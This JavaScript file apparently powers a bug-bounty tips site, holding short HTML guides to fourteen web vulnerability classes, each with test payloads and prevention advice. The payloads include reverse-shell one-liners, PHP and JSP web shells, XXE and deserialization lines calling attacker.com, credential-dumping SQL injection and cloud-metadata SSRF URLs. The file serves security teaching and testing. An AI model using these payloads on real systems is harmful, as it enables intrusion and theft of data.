// Bug hunting tips content
const bugGuides = {
    xss: {
        title: "Cross-Site Scripting (XSS) Guide",
        content: `
            <div class="guide-section">
                <h4>What is XSS?</h4>
                <p>Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find XSS</h4>
                <ol>
                    <li><strong>Identify Input Points:</strong>
                        <ul>
                            <li>Search forms</li>
                            <li>URL parameters</li>
                            <li>Comment sections</li>
                            <li>User profile fields</li>
                            <li>File uploads</li>
                        </ul>
                    </li>
                    <li><strong>Test Basic Payloads:</strong>
                        <pre><code>
&lt;script&gt;alert(1)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
javascript:alert(1)
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Payloads</h4>
                <pre><code>
// Event Handlers
&lt;img src=x onerror=alert(1)&gt;
&lt;body onload=alert(1)&gt;
&lt;input onfocus=alert(1) autofocus&gt;

// JavaScript Protocol
&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;
&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;

// DOM Manipulation
&lt;img src=x onerror="document.body.innerHTML='XSS'"&gt;
&lt;svg onload="document.cookie"&gt;
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Implement Content Security Policy (CSP)</li>
                    <li>Use proper output encoding</li>
                    <li>Validate and sanitize input</li>
                    <li>Use security headers</li>
                </ul>
            </div>
        `
    },
    sql: {
        title: "SQL Injection Guide",
        content: `
            <div class="guide-section">
                <h4>What is SQL Injection?</h4>
                <p>SQL Injection is a code injection technique that exploits vulnerabilities in database queries.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find SQL Injection</h4>
                <ol>
                    <li><strong>Identify Database Interaction Points:</strong>
                        <ul>
                            <li>Login forms</li>
                            <li>Search functionality</li>
                            <li>Product filters</li>
                            <li>User profiles</li>
                            <li>URL parameters</li>
                        </ul>
                    </li>
                    <li><strong>Test Basic Payloads:</strong>
                        <pre><code>
' OR '1'='1
' UNION SELECT 1,2,3--
' OR 1=1--
admin'--
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Advanced Techniques</h4>
                <pre><code>
// Union-Based
' UNION SELECT username,password FROM users--

// Error-Based
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

// Time-Based
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Use parameterized queries</li>
                    <li>Implement input validation</li>
                    <li>Use ORM frameworks</li>
                    <li>Limit database permissions</li>
                </ul>
            </div>
        `
    },
    csrf: {
        title: "CSRF Guide",
        content: `
            <div class="guide-section">
                <h4>What is CSRF?</h4>
                <p>Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to execute unwanted actions.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find CSRF</h4>
                <ol>
                    <li><strong>Identify State-Changing Actions:</strong>
                        <ul>
                            <li>Password changes</li>
                            <li>Email updates</li>
                            <li>Profile modifications</li>
                            <li>Purchase actions</li>
                        </ul>
                    </li>
                    <li><strong>Check for CSRF Protection:</strong>
                        <ul>
                            <li>CSRF tokens</li>
                            <li>SameSite cookies</li>
                            <li>Custom headers</li>
                        </ul>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Testing Methods</h4>
                <pre><code>
// HTML Form
&lt;form action="https://target.com/change-password" method="POST"&gt;
    &lt;input type="hidden" name="new_password" value="hacked"&gt;
    &lt;input type="submit" value="Click me"&gt;
&lt;/form&gt;

// JavaScript
fetch('https://target.com/change-password', {
    method: 'POST',
    body: 'new_password=hacked'
});
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Implement CSRF tokens</li>
                    <li>Use SameSite cookie attribute</li>
                    <li>Verify request origin</li>
                    <li>Use custom request headers</li>
                </ul>
            </div>
        `
    },
    ssrf: {
        title: "Server-Side Request Forgery (SSRF) Guide",
        content: `
            <div class="guide-section">
                <h4>What is SSRF?</h4>
                <p>Server-Side Request Forgery (SSRF) allows attackers to make the server send requests to internal resources or external systems.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find SSRF</h4>
                <ol>
                    <li><strong>Identify URL Parameters:</strong>
                        <ul>
                            <li>Image URLs</li>
                            <li>Webhook endpoints</li>
                            <li>API endpoints</li>
                            <li>File uploads</li>
                        </ul>
                    </li>
                    <li><strong>Test Internal IPs:</strong>
                        <pre><code>
http://localhost
http://127.0.0.1
http://[::1]
http://internal-service
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Payloads</h4>
                <pre><code>
// Localhost
http://localhost:80
http://127.0.0.1:3306
http://[::1]:6379

// Cloud Metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/

// Internal Services
http://internal-service
http://admin.internal
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Whitelist allowed URLs</li>
                    <li>Block internal IP ranges</li>
                    <li>Use URL validation</li>
                    <li>Implement network segmentation</li>
                </ul>
            </div>
        `
    },
    xxe: {
        title: "XML External Entity (XXE) Guide",
        content: `
            <div class="guide-section">
                <h4>What is XXE?</h4>
                <p>XML External Entity (XXE) injection is a web security vulnerability that allows attackers to interfere with XML processing.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find XXE</h4>
                <ol>
                    <li><strong>Identify XML Input Points:</strong>
                        <ul>
                            <li>File uploads</li>
                            <li>API endpoints</li>
                            <li>SOAP requests</li>
                            <li>RSS feeds</li>
                        </ul>
                    </li>
                    <li><strong>Test Basic Payloads:</strong>
                        <pre><code>
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [
    &lt;!ELEMENT foo ANY &gt;
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Advanced Payloads</h4>
                <pre><code>
// Parameter Entities
&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'&gt;"&gt;
%dtd;
%eval;
%exfil;

// Out-of-Band
&lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;
%dtd;
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Disable external entities</li>
                    <li>Use safe XML parsers</li>
                    <li>Implement input validation</li>
                    <li>Use XML schema validation</li>
                </ul>
            </div>
        `
    },
    rce: {
        title: "Remote Code Execution (RCE) Guide",
        content: `
            <div class="guide-section">
                <h4>What is RCE?</h4>
                <p>Remote Code Execution allows attackers to execute arbitrary code on the target server.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find RCE</h4>
                <ol>
                    <li><strong>Identify Command Injection Points:</strong>
                        <ul>
                            <li>File uploads</li>
                            <li>Command execution functions</li>
                            <li>System calls</li>
                            <li>Template engines</li>
                        </ul>
                    </li>
                    <li><strong>Test Basic Payloads:</strong>
                        <pre><code>
; ls -la
| cat /etc/passwd
\`id\`
$(whoami)
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Payloads</h4>
                <pre><code>
// Command Injection
; nc -e /bin/sh 10.0.0.1 4444
| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

// File Upload
&lt;?php system($_GET['cmd']); ?&gt;
&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;

// Template Injection
\${7*7}
&lt;%= 7*7 %&gt;
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Validate and sanitize all input</li>
                    <li>Use safe APIs for system calls</li>
                    <li>Implement proper file upload restrictions</li>
                    <li>Use sandboxing where possible</li>
                </ul>
            </div>
        `
    },
    idor: {
        title: "Insecure Direct Object Reference (IDOR) Guide",
        content: `
            <div class="guide-section">
                <h4>What is IDOR?</h4>
                <p>IDOR occurs when an application exposes direct references to internal objects without proper access controls.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find IDOR</h4>
                <ol>
                    <li><strong>Identify Object References:</strong>
                        <ul>
                            <li>User IDs in URLs</li>
                            <li>File IDs</li>
                            <li>Order numbers</li>
                            <li>Document IDs</li>
                        </ul>
                    </li>
                    <li><strong>Test Access Controls:</strong>
                        <ul>
                            <li>Change IDs in URLs</li>
                            <li>Modify request parameters</li>
                            <li>Test different user roles</li>
                        </ul>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Vulnerabilities</h4>
                <pre><code>
// URL Parameter
https://example.com/user?id=123
https://example.com/user?id=124

// API Endpoint
GET /api/documents/123
GET /api/documents/124

// Request Body
{
    "userId": 123,
    "action": "view"
}
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Implement proper access controls</li>
                    <li>Use indirect object references</li>
                    <li>Validate user permissions</li>
                    <li>Use UUIDs instead of sequential IDs</li>
                </ul>
            </div>
        `
    },
    file_upload: {
        title: "File Upload Vulnerabilities Guide",
        content: `
            <div class="guide-section">
                <h4>What are File Upload Vulnerabilities?</h4>
                <p>File upload vulnerabilities allow attackers to upload malicious files that can lead to remote code execution.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find File Upload Vulnerabilities</h4>
                <ol>
                    <li><strong>Identify Upload Points:</strong>
                        <ul>
                            <li>Profile pictures</li>
                            <li>Document uploads</li>
                            <li>Media uploads</li>
                            <li>File sharing features</li>
                        </ul>
                    </li>
                    <li><strong>Test File Types:</strong>
                        <pre><code>
// Common Extensions
.php
.php3
.php4
.php5
.phtml
.jsp
.asp
.aspx
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Payloads</h4>
                <pre><code>
// PHP Shell
&lt;?php system($_GET['cmd']); ?&gt;

// JSP Shell
&lt;% Runtime.getRuntime().exec(request.getParameter("cmd")); %&gt;

// Double Extension
shell.php.jpg
shell.php%00.jpg

// Content-Type Bypass
Content-Type: image/jpeg
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Validate file types</li>
                    <li>Scan uploaded files</li>
                    <li>Use secure file names</li>
                    <li>Store files outside web root</li>
                </ul>
            </div>
        `
    },
    jwt: {
        title: "JWT Vulnerabilities Guide",
        content: `
            <div class="guide-section">
                <h4>What are JWT Vulnerabilities?</h4>
                <p>JSON Web Token (JWT) vulnerabilities can lead to authentication bypass and privilege escalation.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find JWT Vulnerabilities</h4>
                <ol>
                    <li><strong>Identify JWT Usage:</strong>
                        <ul>
                            <li>Authentication tokens</li>
                            <li>Session management</li>
                            <li>API authentication</li>
                        </ul>
                    </li>
                    <li><strong>Test JWT Structure:</strong>
                        <pre><code>
// JWT Format
header.payload.signature

// Common Algorithms
HS256
RS256
none
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Vulnerabilities</h4>
                <pre><code>
// Algorithm Confusion
{
    "alg": "none"
}

// Weak Secret
{
    "alg": "HS256",
    "typ": "JWT"
}

// Expired Token
{
    "exp": 1516239022
}
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Use strong algorithms</li>
                    <li>Implement proper token validation</li>
                    <li>Set appropriate expiration times</li>
                    <li>Use secure secret keys</li>
                </ul>
            </div>
        `
    },
    race_condition: {
        title: "Race Condition Vulnerabilities Guide",
        content: `
            <div class="guide-section">
                <h4>What are Race Conditions?</h4>
                <p>Race conditions occur when the behavior of a system depends on the relative timing of events.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find Race Conditions</h4>
                <ol>
                    <li><strong>Identify Critical Operations:</strong>
                        <ul>
                            <li>Account creation</li>
                            <li>Payment processing</li>
                            <li>File operations</li>
                            <li>Resource allocation</li>
                        </ul>
                    </li>
                    <li><strong>Test Concurrent Requests:</strong>
                        <pre><code>
// Using Burp Suite
Turbo Intruder
Concurrent Requests

// Using Python
import threading
import requests

def make_request():
    requests.post(url, data=data)
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Vulnerabilities</h4>
                <pre><code>
// TOCTOU (Time of Check to Time of Use)
if (file.exists()) {
    // Time of Check
    // Attacker modifies file here
    file.delete(); // Time of Use
}

// Double Spending
if (balance >= amount) {
    // Attacker makes concurrent request
    balance -= amount;
}
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Use atomic operations</li>
                    <li>Implement proper locking</li>
                    <li>Use database transactions</li>
                    <li>Add request rate limiting</li>
                </ul>
            </div>
        `
    },
    deserialization: {
        title: "Insecure Deserialization Guide",
        content: `
            <div class="guide-section">
                <h4>What is Insecure Deserialization?</h4>
                <p>Insecure deserialization occurs when applications deserialize untrusted data, potentially leading to remote code execution.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find Deserialization Vulnerabilities</h4>
                <ol>
                    <li><strong>Identify Serialized Data:</strong>
                        <ul>
                            <li>PHP serialized objects</li>
                            <li>Java serialized objects</li>
                            <li>JSON data</li>
                            <li>XML data</li>
                        </ul>
                    </li>
                    <li><strong>Test Common Formats:</strong>
                        <pre><code>
// PHP Serialized
O:8:"stdClass":1:{s:1:"x";s:4:"test";}

// Java Serialized
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwABDAAAeHB3BAAAAAF0AANmb28=

// JSON
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
                        </code></pre>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Payloads</h4>
                <pre><code>
// PHP Object Injection
O:8:"stdClass":3:{s:3:"foo";s:4:"test";s:3:"bar";s:4:"test";s:3:"baz";s:4:"test";}

// Java Deserialization
ysoserial CommonsCollections1 'wget http://attacker.com/shell.php' > payload.bin

// Node.js Deserialization
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Use safe deserialization methods</li>
                    <li>Implement input validation</li>
                    <li>Use whitelisting for allowed classes</li>
                    <li>Monitor deserialization operations</li>
                </ul>
            </div>
        `
    },
    business_logic: {
        title: "Business Logic Vulnerabilities Guide",
        content: `
            <div class="guide-section">
                <h4>What are Business Logic Vulnerabilities?</h4>
                <p>Business logic vulnerabilities occur when application workflows can be manipulated to bypass intended functionality.</p>
            </div>
            <div class="guide-section">
                <h4>How to Find Business Logic Vulnerabilities</h4>
                <ol>
                    <li><strong>Identify Critical Workflows:</strong>
                        <ul>
                            <li>Payment processing</li>
                            <li>User registration</li>
                            <li>Order management</li>
                            <li>Account recovery</li>
                        </ul>
                    </li>
                    <li><strong>Test Workflow Manipulation:</strong>
                        <ul>
                            <li>Parameter tampering</li>
                            <li>State manipulation</li>
                            <li>Race conditions</li>
                            <li>Workflow bypass</li>
                        </ul>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Vulnerabilities</h4>
                <pre><code>
// Price Manipulation
{
    "price": 100,
    "quantity": 1,
    "total": 100
}

// Status Manipulation
{
    "order_id": 123,
    "status": "completed"
}

// Parameter Tampering
{
    "user_id": 123,
    "role": "admin"
}
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Implement proper validation</li>
                    <li>Use server-side checks</li>
                    <li>Monitor workflow integrity</li>
                    <li>Regular security audits</li>
                </ul>
            </div>
        `
    },
    api_security: {
        title: "API Security Testing Guide",
        content: `
            <div class="guide-section">
                <h4>What is API Security Testing?</h4>
                <p>API security testing involves identifying vulnerabilities in application programming interfaces.</p>
            </div>
            <div class="guide-section">
                <h4>How to Test API Security</h4>
                <ol>
                    <li><strong>Identify API Endpoints:</strong>
                        <ul>
                            <li>REST APIs</li>
                            <li>GraphQL</li>
                            <li>SOAP</li>
                            <li>Webhooks</li>
                        </ul>
                    </li>
                    <li><strong>Test Common Vulnerabilities:</strong>
                        <ul>
                            <li>Authentication bypass</li>
                            <li>Authorization issues</li>
                            <li>Rate limiting</li>
                            <li>Input validation</li>
                        </ul>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Testing Methods</h4>
                <pre><code>
// Authentication Bypass
GET /api/user/123
Authorization: Bearer null

// GraphQL Injection
{
  "query": "query { user(id: 1) { id name email password } }"
}

// Rate Limiting Bypass
X-Forwarded-For: 127.0.0.1
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Implement proper authentication</li>
                    <li>Use rate limiting</li>
                    <li>Validate all input</li>
                    <li>Use API security tools</li>
                </ul>
            </div>
        `
    },
    graphql: {
        title: "GraphQL Security Testing Guide",
        content: `
            <div class="guide-section">
                <h4>What is GraphQL Security Testing?</h4>
                <p>GraphQL security testing involves identifying vulnerabilities in GraphQL APIs.</p>
            </div>
            <div class="guide-section">
                <h4>How to Test GraphQL Security</h4>
                <ol>
                    <li><strong>Identify GraphQL Endpoints:</strong>
                        <ul>
                            <li>/graphql</li>
                            <li>/api/graphql</li>
                            <li>/graphiql</li>
                            <li>GraphQL playground</li>
                        </ul>
                    </li>
                    <li><strong>Test Common Vulnerabilities:</strong>
                        <ul>
                            <li>Introspection queries</li>
                            <li>Field suggestions</li>
                            <li>Batch queries</li>
                            <li>Depth attacks</li>
                        </ul>
                    </li>
                </ol>
            </div>
            <div class="guide-section">
                <h4>Common Payloads</h4>
                <pre><code>
// Introspection Query
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

// Batch Query
[
  {"query": "query { user(id: 1) { id name } }"},
  {"query": "query { user(id: 2) { id name } }"}
]

// Depth Attack
{
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              title
            }
          }
        }
      }
    }
  }
}
                </code></pre>
            </div>
            <div class="guide-section">
                <h4>Prevention</h4>
                <ul>
                    <li>Disable introspection in production</li>
                    <li>Implement query depth limits</li>
                    <li>Use query complexity analysis</li>
                    <li>Implement rate limiting</li>
                </ul>
            </div>
        `
    }
};

// Modal functionality
document.addEventListener('DOMContentLoaded', function() {
    const modal = document.getElementById('tip-modal');
    const modalTitle = document.getElementById('modal-title');
    const modalContent = document.getElementById('modal-content');
    const closeModal = document.querySelector('.close-modal');

    // Open modal
    document.querySelectorAll('.view-tip').forEach(button => {
        button.addEventListener('click', () => {
            const bugType = button.closest('.tip-card').dataset.bug;
            const guide = bugGuides[bugType];
            
            if (guide) {
                modalTitle.textContent = guide.title;
                modalContent.innerHTML = guide.content;
                modal.style.display = 'block';
                document.body.style.overflow = 'hidden'; // Prevent background scrolling
            }
        });
    });

    // Close modal
    closeModal.addEventListener('click', () => {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto'; // Restore scrolling
    });

    // Close modal when clicking outside
    window.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto'; // Restore scrolling
        }
    });

    // Close modal with Escape key
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && modal.style.display === 'block') {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto'; // Restore scrolling
        }
    });
}); 